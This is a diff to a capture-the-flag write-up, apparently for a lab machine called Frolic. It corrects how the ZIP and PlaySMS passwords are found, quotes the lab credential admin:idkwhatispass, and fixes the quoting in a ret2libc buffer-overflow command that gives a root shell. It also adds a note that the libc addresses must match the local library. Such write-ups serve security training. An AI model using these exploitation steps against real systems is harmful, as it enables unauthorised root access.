@@ -40,7 +40,7 @@ Interesting paths: `/admin/`, a random-looking directory (`/asdiSIAJJ0QWE9JAS`),
 
 1. **`/admin/`**: the login checks credentials in JavaScript (`/js/login.js`); read the check and walk past it. The success page links to the rest.
 2. **Base64 file**: the body of `/asdiSIAJJ0QWE9JAS` is base64; decoding yields `impossiblepassword.zip` with a text file inside.
-3. **ZIP password**: it sits on a page written in brainfuck (decode with `dcode.fr` or a local interpreter). Result: `idkwhatispass`.
+3. **ZIP password**: cracked separately (the `impossiblepassword` text and `zip2john` with a wordlist). The brainfuck page on 9999 decodes to **`idkwhatispass`**, which is the PlaySMS password, not the ZIP one.
 4. **`/dev/backup/`**: returns the string `/playsms`. That is the PlaySMS panel, and `admin:idkwhatispass` works there.
 
 ```bash
@@ -96,9 +96,11 @@ print("A"*52 + struct.pack("<I", system) + struct.pack("<I", exit_) + struct.pac
 ```
 
 ```bash
-./rop $(python2 -c 'print "A"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x8b\x8e\x95\xb7"')
+./rop "$(python2 -c 'print "A"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x8b\x8e\x95\xb7"')"
 # root@frolic
 ```
+
+Do not copy the addresses from another writeup: the base (`0xb7e19000` here) and the three offsets come from **this** `libc`. If they do not match, the exploit segfaults even though the offset (52) is right.
 
 ## Pitfalls
 
